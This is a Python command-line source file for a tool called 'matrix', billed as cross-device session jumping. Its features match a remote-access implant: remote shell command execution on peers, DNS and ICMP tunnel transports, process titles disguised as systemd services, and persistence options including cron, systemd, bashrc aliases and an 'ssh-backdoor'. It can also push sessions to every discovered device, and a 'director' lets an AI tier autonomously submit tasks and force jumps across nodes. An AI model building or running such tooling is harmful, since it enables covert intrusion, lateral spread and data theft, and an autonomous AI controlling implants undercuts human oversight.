#!/usr/bin/env python3
"""
Jump CLI — Command-line interface for cross-device jumping.

Usage:
    matrix listen [--port PORT] [--token TOKEN]
    matrix discover [--timeout SECONDS]
    matrix jump <target> [--files FILE ...] [--token TOKEN]
    matrix multiply --targets <target...> [--strategy STRATEGY]
    matrix status | rain | config
"""

import argparse
import json
import logging
import os
import socket
import sys
import time

from matrix.config import config as _config
from matrix.transport_dns import DNSBackend
from matrix.transport_icmp import ICMPBackend
from matrix.device_discovery import Device, Transport, DiscoveryManager
from matrix.session_jumper import (
    JumpNode, JumpSession, restore_session, JumpError,
    MultiJumpStrategy, MultiJumpResult, TargetResult,
)

logger = logging.getLogger(__name__)


def _build_identity_context(args):
    """Build (identity, trust_store, require_peer_identity) from args/config."""
    from matrix.identity import IdentityKey, PeerTrustStore

    identity = None
    path = getattr(args, "identity", None) or _config.identity_file
    if path:
        identity = IdentityKey.load_or_create(path)

    trust_store = None
    peers = getattr(args, "known_peers", None) or _config.known_peers_file
    if peers:
        trust_store = PeerTrustStore(peers, tofu=_config.trust_on_first_use)

    require = bool(getattr(args, "require_identity", False)
                   or _config.require_peer_identity)
    return identity, trust_store, require


def _build_backend(args, node: JumpNode, target: Device = None):
    """Return an alternate transport backend if DNS/ICMP flags are set."""
    if args.dns_resolver and args.dns_domain:
        remote_id = getattr(args, "target", None) or (target.name if target else "peer")
        return DNSBackend.connect(
            resolver=args.dns_resolver,
            domain=args.dns_domain,
            local_id=node.discovery.node_id,
            remote_id=remote_id,
            port=53,
            timeout=60.0,
        )
    if getattr(args, "icmp", False):
        host = target.address if target else args.target
        return ICMPBackend.connect(
            host=host,
            local_id=node.discovery.node_id,
            timeout=30.0,
        )
    return None


def _maybe_restore_files(session: JumpSession, mode: str) -> None:
    """Restore received files according to policy: ask, always, or never."""
    if not session.files:
        return
    if mode == "never":
        logger.info("  File restore policy is 'never'; skipping received files.")
        return
    if mode == "always":
        restore_session(session, restore_files=True)
        logger.info("  Files restored.")
        return

    # mode == "ask"
    if not sys.stdin.isatty():
        logger.warning("  Non-interactive stdin; skipping file restore prompt.")
        return
    try:
        restore = input("  Restore files to current directory? [y/N] ").strip().lower()
    except (EOFError, OSError):
        logger.warning("  Unable to read restore prompt input; skipping file restore.")
        return
    if restore == "y":
        restore_session(session, restore_files=True)
        logger.info("  Files restored.")


def cmd_listen(args):
    """Start a jump listener, waiting for incoming sessions."""
    if getattr(args, "disguise", None):
        from matrix.disguise import ProcessDisguise
        ProcessDisguise(title=args.disguise).apply()

    restore_mode = args.restore_files

    def on_session(session: JumpSession):
        try:
            logger.info(f"\n[RECEIVED] Session '{session.session_id}' from {session.source_device}")
            logger.info(f"  Timestamp: {time.ctime(session.timestamp)}")
            logger.info(f"  Source CWD: {session.cwd}")
            logger.info(f"  Files: {len(session.files)}")
            logger.info(f"  Metadata: {json.dumps(session.metadata, indent=2)}")
            _maybe_restore_files(session, restore_mode)
        except Exception:
            logger.exception("Failed to process received session '%s'", session.session_id)

    identity, trust_store, require_identity = _build_identity_context(args)
    node = JumpNode(
        node_name=args.name or socket.gethostname(),
        listen_port=args.port,
        auth_token=args.token,
        on_session_received=on_session,
        identity=identity,
        trust_store=trust_store,
        require_peer_identity=require_identity,
    )
    try:
        node.start()
    except PermissionError as e:
        logger.error(str(e))
        node.stop()
        sys.exit(1)
    logger.info(f"Jump node '{node.node_name}' listening on port {args.port}")
    logger.info(f"Node ID: {node.discovery.node_id}")
    if args.token:
        logger.info("Authentication: enabled")
    if identity:
        logger.info(f"Identity fingerprint: {identity.fingerprint}")
    if require_identity:
        logger.info("Peer identity: required")
    logger.info("Waiting for incoming jumps... (Ctrl+C to stop)\n")

    try:
        while True:
            devices = node.discover_targets()
            if devices:
                logger.info(f"[{time.strftime('%H:%M:%S')}] Nearby devices: {len(devices)}")
            time.sleep(5)
    except KeyboardInterrupt:
        logger.info("\nShutting down...")
        node.stop()


def cmd_discover(args):
    """Scan for nearby devices on WiFi and Bluetooth."""
    logger.info("Scanning for nearby devices...")
    dm = DiscoveryManager(listen_port=args.port)
    dm.start()

    deadline = time.time() + args.timeout
    seen = set()
    try:
        while time.time() < deadline:
            devices = dm.get_all_devices()
            for dev in devices:
                if dev.device_id not in seen:
                    seen.add(dev.device_id)
                    logger.info(f"  [{dev.transport.value.upper():9s}] {dev.name:20s}  {dev.address}:{dev.port}  caps={dev.capabilities}")
            remaining = int(deadline - time.time())
            logger.info(f"  Scanning... {remaining}s remaining, {len(seen)} device(s) found")
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    dm.stop()
    logger.info(f"\n\nDiscovery complete. Found {len(seen)} device(s).")
    return list(seen)


def cmd_jump(args):
    """Jump to a target device, transferring current session."""
    identity, trust_store, require_identity = _build_identity_context(args)
    node = JumpNode(
        listen_port=args.port,
        auth_token=args.token,
        identity=identity,
        trust_store=trust_store,
        require_peer_identity=require_identity,
    )
    node.start()
    logger.info(f"Resolving target '{args.target}'...")

    # Allow target to be an IP:port or a discovered device name
    target = _resolve_target(args.target, node, timeout=5)
    if not target:
        logger.error(f"Error: Could not find device '{args.target}'")
        logger.info("Tip: Use 'matrix discover' to find nearby devices,")
        logger.info("     or specify an IP:PORT directly (e.g. 192.168.1.50:47701)")
        node.stop()
        sys.exit(1)

    logger.info(f"Jumping to {target.name} ({target.address}:{target.port})...")

    files = args.files or []
    metadata = {"jump_reason": args.reason} if args.reason else {}
    backend = _build_backend(args, node, target)
    if backend:
        logger.info(f"Using {backend.transport_name} transport")

    try:
        success = node.jump(
            target=target,
            include_env=not args.no_env,
            include_files=files,
            extra_metadata=metadata,
            backend=backend,
        )
        if success:
            logger.info("Jump successful! Session transferred.")
        else:
            logger.warning("Jump completed but receiver reported an issue.")
    except JumpError as e:
        logger.error(f"Jump failed: {e}")
        sys.exit(1)
    finally:
        node.stop()


def cmd_multiply(args):
    """Multiply/duplicate the session to multiple targets simultaneously."""
    identity, trust_store, require_identity = _build_identity_context(args)
    node = JumpNode(
        listen_port=args.port,
        auth_token=args.token,
        identity=identity,
        trust_store=trust_store,
        require_peer_identity=require_identity,
    )
    node.start()

    strategy = MultiJumpStrategy(args.strategy)

    # Resolve targets
    if args.all:
        logger.info("Discovering all nearby devices...")
        time.sleep(min(args.discovery_timeout, 10))
        targets = node.discover_targets()
        if not targets:
            logger.error("No devices found on the network.")
            node.stop()
            sys.exit(1)
        logger.info(f"Found {len(targets)} device(s)")
    elif args.targets:
        targets = []
        for t in args.targets:
            dev = _resolve_target(t, node, timeout=5)
            if dev:
                targets.append(dev)
            else:
                logger.warning(f"Could not resolve target '{t}', skipping")
        if not targets:
            logger.error("No valid targets resolved.")
            node.stop()
            sys.exit(1)
    else:
        logger.error("Specify --targets or --all")
        node.stop()
        sys.exit(1)

    if args.dns_resolver or args.icmp:
        logger.error("DNS/ICMP transports are not supported with multiply in this release.")
        node.stop()
        sys.exit(1)

    logger.info(f"Strategy: {strategy.value.upper()}")
    logger.info(f"Targets:  {len(targets)}")
    for dev in targets:
        logger.info(f"  - {dev.name} ({dev.address}:{dev.port})")

    files = args.files or []
    metadata = {"jump_reason": args.reason} if args.reason else {}

    def on_progress(tr: TargetResult, done: int, total: int):
        status = "OK" if tr.success else f"FAIL ({tr.error})"
        retries = f" (retries: {tr.retries})" if tr.retries else ""
        logger.info(
            f"  [{done}/{total}] {tr.device.name}: {status} "
            f"({tr.elapsed:.2f}s){retries}"
        )

    try:
        result = node.multi_jump(
            targets=targets,
            strategy=strategy,
            include_env=not args.no_env,
            include_files=files,
            extra_metadata=metadata,
            max_retries=args.retries,
            on_progress=on_progress,
        )
        logger.info(f"\n{result.summary()}")
        if not result.any_ok:
            sys.exit(1)
    except JumpError as e:
        logger.error(f"Multiply failed: {e}")
        sys.exit(1)
    finally:
        node.stop()


def cmd_persist(args):
    """Enable/disable persistence mechanisms."""
    from matrix.persistence import PersistenceManager

    mechanisms = list(args.mechanisms) if hasattr(args, "mechanisms") else []
    if "all-linux" in mechanisms:
        mechanisms = PersistenceManager.ALL_LINUX

    command = getattr(args, "command", "matrix listen").split()
    pubkey = getattr(args, "pubkey", None)
    pm = PersistenceManager(command=command, pubkey=pubkey)

    if args.persist_command == "enable":
        results = pm.enable(mechanisms)
    elif args.persist_command == "disable":
        results = pm.disable(mechanisms)
    else:
        results = pm.status()

    for r in results:
        status = "enabled" if r.enabled else "disabled"
        logger.info("  %-20s %s (%s)", r.mechanism, status, r.details or r.path or "-")


def cmd_task(args):
    """Run a shell command on a remote node."""
    identity, trust_store, require_identity = _build_identity_context(args)
    node = JumpNode(
        listen_port=args.port,
        auth_token=args.token,
        identity=identity,
        trust_store=trust_store,
        require_peer_identity=require_identity,
    )
    node.start()

    target = _resolve_target(args.target, node, timeout=5)
    if not target:
        logger.error(f"Error: Could not find device '{args.target}'")
        node.stop()
        sys.exit(1)

    backend = _build_backend(args, node, target)
    if backend:
        logger.info(f"Using {backend.transport_name} transport")

    try:
        result = node.run_task(
            target=target,
            command=args.command,
            cwd=args.cwd,
            timeout=args.timeout,
            shell=not args.no_shell,
            backend=backend,
        )
        output = result.get("output", "")
        if output:
            logger.info(output)
        if result.get("error"):
            logger.error(f"Task error: {result['error']}")
            sys.exit(1)
        code = result.get("exit_code", 0)
        if code != 0:
            logger.warning(f"Command exited with code {code}")
            sys.exit(code)
        logger.info("Task completed.")
    except JumpError as e:
        logger.error(f"Task failed: {e}")
        sys.exit(1)
    finally:
        node.stop()


def cmd_status(args):
    """Show the status of this node."""
    discovery = DiscoveryManager(node_name=args.name or socket.gethostname(), listen_port=args.port)
    logger.info(f"Hostname: {socket.gethostname()}")
    logger.info(f"Node ID:  {discovery.node_id}")
    logger.info(f"Platform: {sys.platform}")
    logger.info(f"CWD:      {os.getcwd()}")

    # Quick network check
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        logger.info(f"Local IP: {local_ip}")
    except OSError:
        logger.warning("Local IP: unavailable")

    # Bluetooth check
    try:
        import bluetooth  # noqa: F401
        logger.info("Bluetooth: available")
    except ImportError:
        logger.info("Bluetooth: not available (install PyBluez for BT support)")


def _resolve_target(target_str: str, node: JumpNode,
                    timeout: float = 5) -> Device | None:
    """Resolve a target string to a Device. Accepts IP:PORT or device name."""
    # Direct IP:PORT
    if ":" in target_str:
        parts = target_str.rsplit(":", 1)
        try:
            port = int(parts[1])
            return Device(
                device_id="direct",
                name=target_str,
                address=parts[0],
                transport=Transport.WIFI,
                port=port,
                last_seen=time.time(),
            )
        except ValueError:
            pass

    # Search via discovery
    deadline = time.time() + timeout
    while time.time() < deadline:
        for dev in node.discover_targets():
            if (dev.name.lower() == target_str.lower() or
                    dev.device_id == target_str or
                    dev.address == target_str):
                return dev
        time.sleep(0.5)
    return None


def main():
    logging.basicConfig(level=logging.INFO, format="%(message)s")
    parser = argparse.ArgumentParser(
        prog="matrix",
        description="Cross-device session jumping via Bluetooth and WiFi",
    )
    parser.add_argument("--port", type=int, default=47701,
                        help="Listen/connect port (default: 47701)",
                        metavar="PORT")
    parser.add_argument("--token", type=str, default=_config.auth_token,
                        help="Authentication token for secure jumps "
                             "(default: MATRIX_AUTH_TOKEN)")
    parser.add_argument("--name", type=str, default=None,
                        help="Node name (default: hostname)")
    parser.add_argument("--identity", type=str, default=None, metavar="PATH",
                        help="Ed25519 identity key file, created if absent "
                             "(default: MATRIX_IDENTITY_FILE)")
    parser.add_argument("--known-peers", type=str, default=None, metavar="PATH",
                        help="Peer trust store file for identity pinning "
                             "(default: MATRIX_KNOWN_PEERS)")
    parser.add_argument("--require-identity", action="store_true",
                        help="Require the peer to present a verified identity "
                             "(defeats MITM on the key exchange)")
    parser.add_argument("--disguise", type=str, default=None, metavar="TITLE",
                        help="Set process title to a benign service name at startup "
                             "(e.g. /usr/lib/systemd/systemd-resolved-helper)")

    sub = parser.add_subparsers(dest="command", required=True)

    # listen
    p_listen = sub.add_parser("listen", help="Listen for incoming jumps")
    p_listen.add_argument(
        "--restore-files",
        choices=["ask", "always", "never"],
        default="ask",
        help="Restore received files policy (default: ask)",
    )
    p_listen.add_argument(
        "--disguise",
        type=str,
        default=None,
        metavar="TITLE",
        help="Set process title to a benign service name at startup",
    )

    # discover
    p_discover = sub.add_parser("discover", help="Discover nearby devices")
    p_discover.add_argument("--timeout", type=int, default=10,
                            help="Scan duration in seconds (default: 10)")

    # jump
    p_jump = sub.add_parser("jump", help="Jump to a target device")
    p_jump.add_argument("target", help="Target device (IP:PORT or name)")
    p_jump.add_argument("--files", nargs="*", help="Files to include")
    p_jump.add_argument("--no-env", action="store_true",
                        help="Don't transfer environment variables")
    p_jump.add_argument("--reason", type=str, help="Jump reason metadata")
    p_jump.add_argument("--dns-resolver", type=str, default=None,
                        help="DNS transport: resolver IP (e.g. 8.8.8.8)")
    p_jump.add_argument("--dns-domain", type=str, default=None,
                        help="DNS transport: domain suffix (e.g. example.com)")
    p_jump.add_argument("--icmp", action="store_true",
                        help="Use ICMP echo tunnel transport (requires root)")

    # multiply (multi-target jump)
    p_multi = sub.add_parser("multiply",
                             help="Duplicate session to multiple targets")
    p_multi.add_argument("--targets", nargs="*",
                         help="Target devices (IP:PORT or names)")
    p_multi.add_argument("--all", action="store_true",
                         help="Jump to all discovered devices")
    p_multi.add_argument("--strategy", default="broadcast",
                         choices=["broadcast", "mirror", "race", "cascade"],
                         help="Dispatch strategy (default: broadcast)")
    p_multi.add_argument("--files", nargs="*", help="Files to include")
    p_multi.add_argument("--no-env", action="store_true",
                         help="Don't transfer environment variables")
    p_multi.add_argument("--reason", type=str, help="Jump reason metadata")
    p_multi.add_argument("--retries", type=int, default=0,
                         help="Per-target retry count (default: 0)")
    p_multi.add_argument("--discovery-timeout", type=int, default=5,
                         help="Seconds to wait for device discovery (default: 5)")
    p_multi.add_argument("--dns-resolver", type=str, default=None,
                         help="DNS transport: resolver IP")
    p_multi.add_argument("--dns-domain", type=str, default=None,
                         help="DNS transport: domain suffix")
    p_multi.add_argument("--icmp", action="store_true",
                         help="Use ICMP echo tunnel transport (requires root)")

    # persist
    p_persist = sub.add_parser("persist", help="Persistence and survival controls")
    persist_sub = p_persist.add_subparsers(dest="persist_command", required=True)
    p_persist_enable = persist_sub.add_parser("enable", help="Install persistence mechanisms")
    p_persist_enable.add_argument(
        "mechanisms",
        nargs="+",
        choices=["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias", "ssh-backdoor", "all-linux"],
        help="Persistence mechanisms to install",
    )
    p_persist_enable.add_argument(
        "--command", type=str, default="matrix listen",
        help="Command to persist (default: 'matrix listen')",
    )
    p_persist_enable.add_argument(
        "--pubkey", type=str, default=None,
        help="SSH public key for ssh-backdoor mechanism",
    )
    p_persist_disable = persist_sub.add_parser("disable", help="Remove persistence mechanisms")
    p_persist_disable.add_argument(
        "mechanisms",
        nargs="+",
        choices=["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias", "ssh-backdoor", "all-linux"],
        help="Persistence mechanisms to remove",
    )
    persist_sub.add_parser("status", help="Show persistence status")

    # task
    p_task = sub.add_parser("task", help="Run a shell command on a target node")
    p_task.add_argument("target", help="Target device (IP:PORT or name)")
    p_task.add_argument("command", help="Shell command to execute")
    p_task.add_argument("--cwd", type=str, default=None,
                        help="Working directory on the target")
    p_task.add_argument("--timeout", type=float, default=300.0,
                        help="Maximum seconds to wait for command output")
    p_task.add_argument("--no-shell", action="store_true",
                        help="Split command with shlex instead of using a shell")
    p_task.add_argument("--dns-resolver", type=str, default=None,
                        help="DNS transport: resolver IP")
    p_task.add_argument("--dns-domain", type=str, default=None,
                        help="DNS transport: domain suffix")
    p_task.add_argument("--icmp", action="store_true",
                        help="Use ICMP echo tunnel transport (requires root)")

    # status
    p_status = sub.add_parser("status", help="Show node status")

    # rain
    p_rain = sub.add_parser("rain", help="Matrix digital rain")
    p_rain.add_argument("--instrumented", action="store_true",
                        help="Show live mirror_blend stats overlay")

    # config
    p_config = sub.add_parser("config", help="Show loaded configuration")

    # director
    p_director = sub.add_parser("director", help="Tri-State Director controls")
    director_sub = p_director.add_subparsers(dest="director_command", required=True)
    p_director_start = director_sub.add_parser(
        "start", help="Start director alongside listener")
    p_director_start.add_argument(
        "--containment",
        choices=["unrestricted", "restricted", "advisory", "disabled"],
        default=_config.director_containment,
        help="Bound the AI tier (default: MATRIX_DIRECTOR_CONTAINMENT). "
             "advisory/disabled prevent autonomous code upgrade and termination.",
    )
    director_sub.add_parser("status", help="Show director state")
    director_sub.add_parser("override", help="Human takes direct control")
    director_sub.add_parser("release", help="Release human override")
    director_sub.add_parser("audit", help="Show director audit log")
    p_director_escalate = director_sub.add_parser(
        "escalate", help="Manually trigger AI escalation"
    )
    p_director_escalate.add_argument(
        "--reason", type=str, default="", help="Reason for manual escalation"
    )

    args = parser.parse_args()

    # Apply runtime process disguise before any visible work begins
    if args.disguise:
        from matrix.disguise import ProcessDisguise
        ProcessDisguise(title=args.disguise).apply()

    # Validate port range
    if not (1 <= args.port <= 65535):
        parser.error(f"Port must be between 1 and 65535, got {args.port}")

    # Clamp discovery timeout if present
    if hasattr(args, "timeout") and args.timeout is not None:
        args.timeout = max(1, min(args.timeout, 300))
    if hasattr(args, "discovery_timeout") and args.discovery_timeout is not None:
        args.discovery_timeout = max(1, min(args.discovery_timeout, 300))

    commands = {
        "listen": cmd_listen,
        "discover": cmd_discover,
        "jump": cmd_jump,
        "multiply": cmd_multiply,
        "task": cmd_task,
        "persist": cmd_persist,
        "status": cmd_status,
        "rain": cmd_rain,
        "config": cmd_config,
        "director": cmd_director,
    }
    commands[args.command](args)


def cmd_rain(args):
    """Launch the Matrix digital rain."""
    if not sys.stdout.isatty():
        logger.error("rain requires a real terminal.")
        sys.exit(1)
    from matrix.gut_check import MatrixRain, InstrumentedRain
    if args.instrumented:
        engine = InstrumentedRain()
    else:
        engine = MatrixRain()
    engine.run()


def cmd_config(args):
    """Show the current loaded configuration."""
    from matrix.config import config
    from dataclasses import fields
    _mask_fields = {"auth_token", "llm_api_key"}
    for f in fields(config):
        value = getattr(config, f.name)
        if f.name in _mask_fields and value:
            value = value[:4] + "****"
        logger.info(f"  {f.name:25s} = {value}")


# ── Director Command Group ───────────────────────────────────────────────────

# Global director reference (set by cmd_director start, used by subcommands).
_director_instance = None


def cmd_director(args):
    """Tri-State Director controls."""
    global _director_instance  # noqa: PLW0603

    subcmd = args.director_command

    if subcmd == "start":
        _director_start(args)
    elif subcmd == "status":
        _director_status()
    elif subcmd == "override":
        _director_override()
    elif subcmd == "release":
        _director_release()
    elif subcmd == "audit":
        _director_audit()
    elif subcmd == "escalate":
        _director_escalate(args)


def _director_start(args):
    """Start the director alongside a listener node."""
    global _director_instance  # noqa: PLW0603

    from matrix.mirror_blend import MirrorRegistry, Blender
    from matrix.autonomous import AutonomousLoop, system_metrics
    from matrix.director import TriStateDirector, ContainmentPolicy
    from matrix.node_manager import NodeManager

    registry = MirrorRegistry()
    blender = Blender(registry)
    loop = AutonomousLoop(registry, blender, tick_interval=1.0)
    loop.add_metrics_collector(system_metrics)
    loop.start()

    # NodeManager closes the loop: health ticks, auto-heal tasks, and the
    # director's submit_task / force_session_jump tools all run through it.
    # Active probing is on in production so health decisions rest on TCP
    # reachability + task success evidence, not just heartbeat age.
    node_mgr = NodeManager(autonomous=loop, probe_enabled=True)
    node_mgr.start()

    policy = ContainmentPolicy.from_name(
        getattr(args, "containment", None) or _config.director_containment
    )
    _director_instance = TriStateDirector(loop, node_mgr=node_mgr, policy=policy)
    _director_instance.start()

    logger.info("Director started.  State: %s  Containment: %s",
                _director_instance.state.value, policy.mode)
    logger.info("Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        _director_instance.stop()
        node_mgr.stop()
        loop.stop()
        logger.info("Director stopped.")


def _director_status():
    if _director_instance is None:
        logger.error("Director is not running.  Start it with: matrix director start")
        return
    import json as _json
    logger.info(_json.dumps(_director_instance.status, indent=2))


def _director_override():
    if _director_instance is None:
        logger.error("Director is not running.")
        return
    _director_instance.human_override()
    logger.info("HUMAN OVERRIDE active.  Release with: matrix director release")


def _director_release():
    if _director_instance is None:
        logger.error("Director is not running.")
        return
    try:
        _director_instance.release_override()
        logger.info("Override released.  State: AUTONOMOUS")
    except Exception as exc:
        logger.error("Release failed: %s", exc)


def _director_audit():
    if _director_instance is None:
        logger.error("Director is not running.")
        return
    for entry in _director_instance.audit_log:
        logger.info(
            "[%s] %s  %s -> %s  %s",
            time.strftime("%H:%M:%S", time.localtime(entry.timestamp)),
            entry.category,
            entry.from_state,
            entry.to_state,
            entry.details,
        )
    if not _director_instance.audit_log:
        logger.info("No audit entries yet.")


def _director_escalate(args):
    if _director_instance is None:
        logger.error("Director is not running.")
        return
    _director_instance.manual_escalate(reason=args.reason)
    logger.info("Manual escalation triggered.")


if __name__ == "__main__":
    main()
